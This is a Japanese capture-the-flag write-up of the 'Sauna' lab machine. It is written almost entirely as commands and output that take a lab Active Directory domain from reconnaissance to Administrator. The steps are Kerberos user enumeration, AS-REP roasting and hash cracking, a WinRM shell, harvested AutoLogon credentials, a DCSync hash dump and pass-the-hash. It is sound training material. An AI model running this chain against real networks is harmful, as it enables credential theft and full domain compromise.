# Recon

```
┌──(shoebill㉿shoebill)-[~/Sauna_10.10.10.175]
└─$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 10.10.10.175
...
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-10-15 09:25:01Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
...
```

Ldapに関するnmapのスキャンにより、ドメイン名は「EGOTISTICAL-BANK.LOCAL」と判明：

```
┌──(shoebill㉿shoebill)-[~/Sauna_10.10.10.175]
└─$ nmap -vv --reason -Pn -T4 -sV -p 3268 "--script=banner,(ldap* or ssl*) and not (brute or broadcast or dos or external or fuzzer)"
PORT     STATE SERVICE REASON          VERSION
3268/tcp open  ldap    syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
...
```

80番ポートが開いてるのでブラウザでページにアクセスすると、ターゲットのユーザ情報がある`http://10.10.10.175/about.html`というページを発見：

![usersfound](https://user-images.githubusercontent.com/85237728/196024427-eb822a72-6454-4c8f-aeee-63282f801e10.png)

これより、ユーザリストusers.txtを以下のように作成する：

（※ いろんな形でユーザリストを作って試した結果この形がうまくいった）

```
┌──(shoebill㉿shoebill)-[~/Sauna_10.10.10.175]
└─$ cat users.txt
FSmith
HBear
SKerb
BTaylor
SCoins
SDriver
```

このユーザリストを用いて、kerbruteで実際に存在するユーザを探すと、「FSmith」というユーザの存在が判明した：

```
┌──(shoebill㉿shoebill)-[~/Sauna_10.10.10.175]
└─$ kerbrute userenum -v --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/16/22 - Ronnie Flathers @ropnop

2022/10/16 14:36:53 >  Using KDC(s):
2022/10/16 14:36:53 >   10.10.10.175:88

2022/10/16 14:36:53 >  [!] SCoins@EGOTISTICAL-BANK.LOCAL - User does not exist
2022/10/16 14:36:53 >  [!] SKerb@EGOTISTICAL-BANK.LOCAL - User does not exist
2022/10/16 14:36:53 >  [!] HBear@EGOTISTICAL-BANK.LOCAL - User does not exist
2022/10/16 14:36:54 >  [+] VALID USERNAME:       FSmith@EGOTISTICAL-BANK.LOCAL
2022/10/16 14:36:54 >  [!] BTaylor@EGOTISTICAL-BANK.LOCAL - User does not exist
2022/10/16 14:36:54 >  [!] SDriver@EGOTISTICAL-BANK.LOCAL - User does not exist
2022/10/16 14:36:54 >  Done! Tested 6 usernames (1 valid) in 0.828 seconds
```
# initial shell

試しにGetNPUsers.pyをFSmithに対して実行してみる。
<br>（ユーザ名が得られたらまずAS-REPRoast攻撃が可能かを確認するいつものパターン）

```
┌──(shoebill㉿shoebill)-[~/Sauna_10.10.10.175]
└─$ impacket-GetNPUsers -no-pass -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/FSmith

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for FSmith
$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:b91b5738e7e3d62156a12de7f016467b$eb2857024894a492f7b7ec198942cff53bb7a59d6bcae4709e4445678f7c5c95979d34a9cb60f0c1aa1c467f513392b13824493506ed4d9bddd2b967f4beb0f3573bb45baed4ced77bd61205ff07060868fc9455a39a3494d0160d14bf7d24dcf0aab711556ebbf7b44bd5eb145d7f10c4bc8e8cac2b96b8c6f250d0ffa3c3f9fe3c623e4321165c3e383b876451b68d02595c012ed30ad27f797c45e356c94a4a79b1a40644e6eb4d1a034b61a3d46b6a1d09ef7a0afbe2ec6eb30be85f8ec70759df2d18836619453443d40aa2af7f2fb4a7d073c5c42cf903593df7d92bd4de31c04284dd03521ed20266d5521e2982b23b6f83b0859e907bcba7a4b3ff22
```
上記のようにFSmithはAS-REPRoastableなユーザだった。

このハッシュを”hash”というファイル名に保存してクラックする：

```
┌──(shoebill㉿shoebill)-[~/Sauna_10.10.10.175]
└─$ hashcat -a 0 -m 18200 hash /usr/share/wordlists/rockyou.txt 
...
$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:b91...f22:Thestrokes23
...
```

このクリデンシャルを使ってFSmithのシェルをとる：

```
┌──(shoebill㉿shoebill)-[~/Sauna_10.10.10.175]
└─$ evil-winrm -i 10.10.10.175 -u FSmith -p Thestrokes23

*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami
egotisticalbank\fsmith
```
# Privesc

FSmith上でwinpeasを実行したら、ユーザsvc_loanmgrのパスワードが判明：

```
*Evil-WinRM* PS C:\Users\FSmith> .\winpeas.exe
...
Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
```

（ユーザネームはsvc_loanmanagerではなくsvc_loanmgrということはFSmith上で調べ済み）


次のようにしてsvc_loanmgrのシェルがとれる：

```
┌──(shoebill㉿shoebill)-[~/Sauna_10.10.10.175]
└─$ evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'

*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents>whoami
egotisticalbank\svc_loanmgr
```

bloodhoundよりsvc_loanmgrについてDCSyncの攻撃が可能とわかる：

![svc-mgr-dcsyng](https://user-images.githubusercontent.com/85237728/196099439-b10878d9-e836-4d0b-8dac-95d8b4f16363.png)

次のようにユーザのハッシュをダンプする：

```
┌──(shoebill㉿shoebill)-[~/Sauna_10.10.10.175]
└─$ impacket-secretsdump -dc-ip 10.10.10.175 'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
...
```

Pass-the-HashでAdminのシェルをとる：

```
┌──(shoebill㉿shoebill)-[~/Sauna_10.10.10.175]
└─$ evil-winrm -i 10.10.10.175 -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e
...
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
egotisticalbank\administrator
```
